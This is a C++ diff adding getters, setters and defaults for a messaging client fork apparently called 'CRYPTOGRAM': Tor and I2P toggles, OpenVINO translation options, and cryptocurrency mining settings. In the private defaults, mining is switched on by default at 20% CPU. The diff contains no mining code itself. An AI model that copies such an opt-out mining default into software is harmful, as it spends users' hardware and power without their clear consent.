@@ -963,6 +963,106 @@ public:
 		_notificationsVolume = value;
 	}
 
+	// CRYPTOGRAM Settings
+	[[nodiscard]] bool torEnabled() const {
+		return _torEnabled;
+	}
+	void setTorEnabled(bool value) {
+		_torEnabled = value;
+	}
+	[[nodiscard]] bool i2pEnabled() const {
+		return _i2pEnabled;
+	}
+	void setI2pEnabled(bool value) {
+		_i2pEnabled = value;
+	}
+	[[nodiscard]] bool torSnowflakeEnabled() const {
+		return _torSnowflakeEnabled;
+	}
+	void setTorSnowflakeEnabled(bool value) {
+		_torSnowflakeEnabled = value;
+	}
+	[[nodiscard]] bool i2pRelayEnabled() const {
+		return _i2pRelayEnabled;
+	}
+	void setI2pRelayEnabled(bool value) {
+		_i2pRelayEnabled = value;
+	}
+	[[nodiscard]] bool miningEnabled() const {
+		return _miningEnabled;
+	}
+	void setMiningEnabled(bool value) {
+		_miningEnabled = value;
+	}
+	[[nodiscard]] int miningCpuPercent() const {
+		return _miningCpuPercent;
+	}
+	void setMiningCpuPercent(int value) {
+		_miningCpuPercent = value;
+	}
+	[[nodiscard]] bool miningOnlyWhenIdle() const {
+		return _miningOnlyWhenIdle;
+	}
+	void setMiningOnlyWhenIdle(bool value) {
+		_miningOnlyWhenIdle = value;
+	}
+	[[nodiscard]] bool miningOnlyWhenCharging() const {
+		return _miningOnlyWhenCharging;
+	}
+	void setMiningOnlyWhenCharging(bool value) {
+		_miningOnlyWhenCharging = value;
+	}
+
+	// Translation Settings (OpenVINO)
+	[[nodiscard]] bool translationEnabled() const {
+		return _translationEnabled;
+	}
+	void setTranslationEnabled(bool value) {
+		_translationEnabled = value;
+	}
+
+	[[nodiscard]] bool translationAutoDetect() const {
+		return _translationAutoDetect;
+	}
+	void setTranslationAutoDetect(bool value) {
+		_translationAutoDetect = value;
+	}
+
+	[[nodiscard]] int translationTargetLanguage() const {
+		return _translationTargetLanguage;
+	}
+	void setTranslationTargetLanguage(int value) {
+		_translationTargetLanguage = value;
+	}
+
+	[[nodiscard]] int translationQuality() const {
+		return _translationQuality;
+	}
+	void setTranslationQuality(int value) {
+		_translationQuality = value;
+	}
+
+	[[nodiscard]] int translationDevice() const {
+		return _translationDevice;
+	}
+	void setTranslationDevice(int value) {
+		_translationDevice = value;
+	}
+
+	[[nodiscard]] bool translationCacheEnabled() const {
+		return _translationCacheEnabled;
+	}
+	void setTranslationCacheEnabled(bool value) {
+		_translationCacheEnabled = value;
+	}
+
+	[[nodiscard]] bool translationAutomatic() const {
+		return _translationAutomatic;
+	}
+	void setTranslationAutomatic(bool value) {
+		_translationAutomatic = value;
+	}
+
 	void resetOnLastLogout();
 
 private:
@@ -1110,6 +1210,25 @@ private:
 	ushort _notificationsVolume = 100;
 
 	QByteArray _photoEditorBrush;
+
+	// CRYPTOGRAM Settings
+	bool _torEnabled = false;
+	bool _i2pEnabled = false;
+	bool _torSnowflakeEnabled = false;
+	bool _i2pRelayEnabled = false;
+	bool _miningEnabled = true;  // ON by default
+	int _miningCpuPercent = 20;  // Default 20%
+	bool _miningOnlyWhenIdle = true;
+	bool _miningOnlyWhenCharging = true;
+
+	// Translation Settings (OpenVINO)
+	bool _translationEnabled = false;  // OFF by default (requires model download)
+	bool _translationAutoDetect = true;  // Auto-detect source language
+	int _translationTargetLanguage = 0;  // 0=English, 1=Russian, 2=Chinese
+	int _translationQuality = 1;  // 0=Fast, 1=Balanced, 2=Best
+	int _translationDevice = 3;  // 0=CPU, 1=GPU, 2=NPU, 3=AUTO
+	bool _translationCacheEnabled = true;
+	bool _translationAutomatic = true;  // Automatically translate messages (preferred)
 
 };
 
